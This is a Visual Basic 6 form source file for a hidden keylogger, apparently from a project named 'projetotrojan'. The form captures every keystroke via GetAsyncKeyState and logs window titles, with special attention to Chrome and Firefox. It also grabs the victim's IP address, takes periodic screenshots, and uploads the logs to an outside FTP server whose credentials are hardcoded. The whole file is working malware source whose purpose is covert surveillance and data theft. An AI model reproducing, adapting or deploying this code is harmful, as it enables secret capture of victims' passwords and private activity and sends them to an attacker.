VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   4275
   ClientLeft      =   165
   ClientTop       =   555
   ClientWidth     =   10545
   LinkTopic       =   "Form1"
   ScaleHeight     =   4275
   ScaleWidth      =   10545
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   6840
      Top             =   3600
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      Protocol        =   2
      RemoteHost      =   "ftp.projetotrojan.esy.es"
      RemotePort      =   21
      URL             =   "ftp://u752146667.root:qweasd3274@ftp.projetotrojan.esy.es"
      UserName        =   "u752146667.root"
      Password        =   "qweasd3274"
   End
   Begin VB.Timer Timer3 
      Interval        =   1000
      Left            =   5760
      Top             =   3720
   End
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   600
      Top             =   11160
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   0
      Top             =   11280
   End
   Begin VB.TextBox Text1 
      Height          =   3015
      Left            =   240
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   240
      Width           =   10095
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
    
Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As Integer 'import para capturar numero da tecla pressionada
Dim textbuffer_janela As String
Dim num_janela As Long

'used by timer which call write in disk function
Dim ctd As Integer

'time in minutes to perform the function that
Const X_WRITE_DISK = 0.1  'write data in disk
Const X_SCREENSHOT = 1  'take an screenshot
'Const X_SEND_FTP = 1 send all captured data to ftp - not implemented

'Credentials for ftp login below
Const FTP_HOST = "ftp.projetotrojan.esy.es" 'ftp host
Const FTP_USER = "u752146667.root" 'ftp user
Const FTP_PASS = "qweasd3274" 'ftp pass

'read current window title
Private Function GetActiveWindowTitle() As String
Dim textlen As Long
Dim titlebar As String
Dim slength As Long

textlen = 999999
titlebar = Space(textlen + 1)
slength = GetWindowText(GetForegroundWindow, titlebar, textlen + 1)
titlebar = Left(titlebar, slength)
GetActiveWindowTitle = titlebar
End Function

'get ip address using one ip check service and extract the ip information (surronded by <h3> html tag)
Public Function getIpAdress()
Dim posicaoH3 As Integer
Dim objHttp As Object, strURL As String, strText As String
Set objHttp = CreateObject("MSXML2.ServerXMLHTTP")
strURL = "http://www.ip-adress.com/"

objHttp.Open "GET", strURL, False
objHttp.setRequestHeader "User-Agent", _
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
objHttp.Send ("")
strText = objHttp.responseText
Set objHttp = Nothing
posicaoH3 = InStr(1, strText, "<h3>")
strText = Mid$(strText, posicaoH3, 50)
getIpAdress = strText
End Function

'function that returns the pressed character
Public Function retorna_tecla_function()
Dim retorna_tecla As String
Dim i As Integer, x As Integer
For i = 8 To 222
x = GetAsyncKeyState(i)

If x = -32767 Then

If i = vbKeyBack Then retorna_tecla = retorna_tecla + " [Backspace]"
If i = vbKeyTab Then retorna_tecla = retorna_tecla + " [Tab] "
If i = vbKeyClear Then retorna_tecla = retorna_tecla + " [~unknow~] "
If i = vbKeyReturn Then retorna_tecla = retorna_tecla + " [Enter] " & vbCrLf
If i = vbKeyControl Then retorna_tecla = retorna_tecla + " [Control] "
If i = vbKeyPause Then retorna_tecla = retorna_tecla + " [Pause] "
If i = vbKeyCapital Then retorna_tecla = retorna_tecla + " [Caps Lock] "
If i = vbKeyEscape Then retorna_tecla = retorna_tecla + " [Escape] "
If i = vbKeySpace Then retorna_tecla = retorna_tecla + " [Space] "
If i = vbKeyPageUp Then retorna_tecla = retorna_tecla + " [RePag] "
If i = vbKeyPageDown Then retorna_tecla = retorna_tecla + " [AvPag] "
If i = vbKeyEnd Then retorna_tecla = retorna_tecla + " [End] "
If i = vbKeyHome Then retorna_tecla = retorna_tecla + " [Home] "
If i = vbKeyLeft Then retorna_tecla = retorna_tecla + " [Left] "
If i = vbKeyUp Then retorna_tecla = retorna_tecla + " [Up] "
If i = vbKeyRight Then retorna_tecla = retorna_tecla + " [Right] "
If i = vbKeyDown Then retorna_tecla = retorna_tecla + " [Down] "
If i = vbKeySelect Then retorna_tecla = retorna_tecla + " [Select] "
If i = vbKeyPrint Then retorna_tecla = retorna_tecla + " [Print Screen] "
If i = vbKey0 Then retorna_tecla = retorna_tecla + "0"
If i = vbKey1 Then retorna_tecla = retorna_tecla + "1"
If i = vbKey2 Then retorna_tecla = retorna_tecla + "2"
If i = vbKey3 Then retorna_tecla = retorna_tecla + "3"
If i = vbKey4 Then retorna_tecla = retorna_tecla + "4"
If i = vbKey5 Then retorna_tecla = retorna_tecla + "5"
If i = vbKey6 Then retorna_tecla = retorna_tecla + "6"
If i = vbKey7 Then retorna_tecla = retorna_tecla + "7"
If i = vbKey8 Then retorna_tecla = retorna_tecla + "8"
If i = vbKey9 Then retorna_tecla = retorna_tecla + "9"
If i = vbKeyA Then retorna_tecla = retorna_tecla + "A"
If i = vbKeyB Then retorna_tecla = retorna_tecla + "B"
If i = vbKeyC Then retorna_tecla = retorna_tecla + "C"
If i = vbKeyD Then retorna_tecla = retorna_tecla + "D"
If i = vbKeyE Then retorna_tecla = retorna_tecla + "E"
If i = vbKeyF Then retorna_tecla = retorna_tecla + "F"
If i = vbKeyG Then retorna_tecla = retorna_tecla + "G"
If i = vbKeyH Then retorna_tecla = retorna_tecla + "H"
If i = vbKeyI Then retorna_tecla = retorna_tecla + "I"
If i = vbKeyJ Then retorna_tecla = retorna_tecla + "J"
If i = vbKeyK Then retorna_tecla = retorna_tecla + "K"
If i = vbKeyL Then retorna_tecla = retorna_tecla + "L"
If i = vbKeyM Then retorna_tecla = retorna_tecla + "M"
If i = vbKeyN Then retorna_tecla = retorna_tecla + "N"
If i = vbKeyO Then retorna_tecla = retorna_tecla + "O"
If i = vbKeyP Then retorna_tecla = retorna_tecla + "P"
If i = vbKeyQ Then retorna_tecla = retorna_tecla + "Q"
If i = vbKeyR Then retorna_tecla = retorna_tecla + "R"
If i = vbKeyS Then retorna_tecla = retorna_tecla + "S"
If i = vbKeyT Then retorna_tecla = retorna_tecla + "T"
If i = vbKeyU Then retorna_tecla = retorna_tecla + "U"
If i = vbKeyV Then retorna_tecla = retorna_tecla + "V"
If i = vbKeyW Then retorna_tecla = retorna_tecla + "W"
If i = vbKeyX Then retorna_tecla = retorna_tecla + "X"
If i = vbKeyY Then retorna_tecla = retorna_tecla + "Y"
If i = vbKeyZ Then retorna_tecla = retorna_tecla + "Z"
If i = vbKeyNumpad0 Then retorna_tecla = retorna_tecla + "0"
If i = vbKeyNumpad1 Then retorna_tecla = retorna_tecla + "1"
If i = vbKeyNumpad2 Then retorna_tecla = retorna_tecla + "2"
If i = vbKeyNumpad3 Then retorna_tecla = retorna_tecla + "3"
If i = vbKeyNumpad4 Then retorna_tecla = retorna_tecla + "4"
If i = vbKeyNumpad5 Then retorna_tecla = retorna_tecla + "5"
If i = vbKeyNumpad6 Then retorna_tecla = retorna_tecla + "6"
If i = vbKeyNumpad7 Then retorna_tecla = retorna_tecla + "7"
If i = vbKeyNumpad8 Then retorna_tecla = retorna_tecla + "8"
If i = vbKeyNumpad9 Then retorna_tecla = retorna_tecla + "9"
If i = vbKeyMultiply Then retorna_tecla = retorna_tecla + "*"
If i = vbKeyAdd Then retorna_tecla = retorna_tecla + "+"
If i = vbKeySubtract Then retorna_tecla = retorna_tecla + "-"
If i = vbKeyDecimal Then retorna_tecla = retorna_tecla + "."
If i = vbKeyDivide Then retorna_tecla = retorna_tecla + "/"
If i = vbKeyF1 Then retorna_tecla = retorna_tecla + "F1"
If i = vbKeyF2 Then retorna_tecla = retorna_tecla + "F2"
If i = vbKeyF3 Then retorna_tecla = retorna_tecla + "F3"
If i = vbKeyF4 Then retorna_tecla = retorna_tecla + "F4"
If i = vbKeyF5 Then retorna_tecla = retorna_tecla + "F5"
If i = vbKeyF6 Then retorna_tecla = retorna_tecla + "F6"
If i = vbKeyF7 Then retorna_tecla = retorna_tecla + "F7"
If i = vbKeyF8 Then retorna_tecla = retorna_tecla + "F8"
If i = vbKeyF9 Then retorna_tecla = retorna_tecla + "F9"
If i = vbKeyF10 Then retorna_tecla = retorna_tecla + "F10"
If i = vbKeyF11 Then retorna_tecla = retorna_tecla + "F11"
If i = vbKeyF12 Then retorna_tecla = retorna_tecla + "F12"
If i = vbKeyF13 Then retorna_tecla = retorna_tecla + "F13"
If i = vbKeyF14 Then retorna_tecla = retorna_tecla + "F14"
If i = vbKeyF15 Then retorna_tecla = retorna_tecla + "F15"
If i = vbKeyF16 Then retorna_tecla = retorna_tecla + "F16"
If i = 186 Then retorna_tecla = retorna_tecla + "Ç"
If i = 160 Then retorna_tecla = retorna_tecla + " [Shift] "
If i = 18 Then retorna_tecla = retorna_tecla + " [lfAlt] "
If i = vbKeyNumlock Then retorna_tecla = retorna_tecla + " [NumLock] "
'if key is unknow by the function, returns ANSII code of the key
If retorna_tecla = "" Then retorna_tecla = "{" + Str(i) + "}"

End If
Next
retorna_tecla_function = retorna_tecla_function + retorna_tecla
retorna_tecla = ""
End Function



Private Sub Form_Load()
If Dir$(App.Path + "\data_klg") = "" Then
    MkDir$ App.Path + "\data_klg"
End If




'Set ftp credentials to VB6 Ftp Component
'Inet1.URL = FTP_HOST
'Inet1.UserName = FTP_USER
'Inet1.Password = FTP_PASS

'load basic data from the system for hack
Text1.Text = Text1.Text + "Hora de inicialização:" + Date$ + "-" + Time$ + vbCrLf + "bloco possivelmente contendo o ip:" + vbCrLf + vbCrLf + "::::" + vbCrLf + getIpAdress() + vbCrLf + "::::" + vbCrLf + vbCrLf
End Sub

Private Sub Form_Terminate()
'in the future, call the function for send logfiles to an ftp server
End Sub

Private Sub Timer1_Timer()
 Text1.Text = Text1.Text + retorna_tecla_function
End Sub

'the code below records the title of the window in the buffer
'RULES: Write only if title is different than last wirited and current active window is different than last corrent window
'If current active window is one browser the active window different rule is ignored.

Private Sub Timer2_Timer()
    Dim verifica_aba
    Dim ler_janela As Boolean
    
    verifica_aba = InStr(1, GetActiveWindowTitle, "Chrome")
    If verifica_aba = 0 Then
        verifica_aba = InStr(1, GetActiveWindowTitle, "Firefox")
    End If
    
    If verifica_aba <> 0 Then
        ler_janela = True
    End If
    
    If (GetActiveWindowTitle <> textbuffer_janela) And ((GetForegroundWindow <> num_janela) Or (ler_janela = True)) Then
        num_janela = GetForegroundWindow
        textbuffer_janela = GetActiveWindowTitle
        Text1.Text = Text1.Text + vbCrLf + "{" + GetActiveWindowTitle + "}" + vbCrLf
    End If

End Sub

Private Sub write_to_buffer()
    Dim fso As New FileSystemObject
    Dim arqtxt As TextStream
    Dim filename As String
    filename = Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
    Set arqtxt = fso.CreateTextFile(App.Path + "/data_klg/" + filename, True)
    arqtxt.Write (Text1.Text)
    Text1.Text = ""
    send_ftp_data filename
End Sub

Private Sub take_a_screenshot()
    SavePicture CaptureScreen(), App.Path + "/data_klg/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
End Sub

Private Sub send_ftp_data(ByVal filename As String)
    If Inet1.StillExecuting Then
        Inet1.Cancel
    End If
    
    Inet1.Execute , "send " & App.Path & "\data_klg\" & filename & " " & filename
    
    Do While Inet1.StillExecuting
        DoEvents
    Loop
End Sub

'this logical is simple
'the time bellow execultes in a interval of one second
'but he calls the function only every 60 * x executions
'This is nescessary becouse the timer object in vb6 not support large intervals
Private Sub Timer3_Timer()
    ctd = ctd + 1
    
    If ctd Mod (60 * X_WRITE_DISK) = 0 Then write_to_buffer
    If ctd Mod (60 * X_SCREENSHOT) = 0 Then take_a_screenshot
End Sub
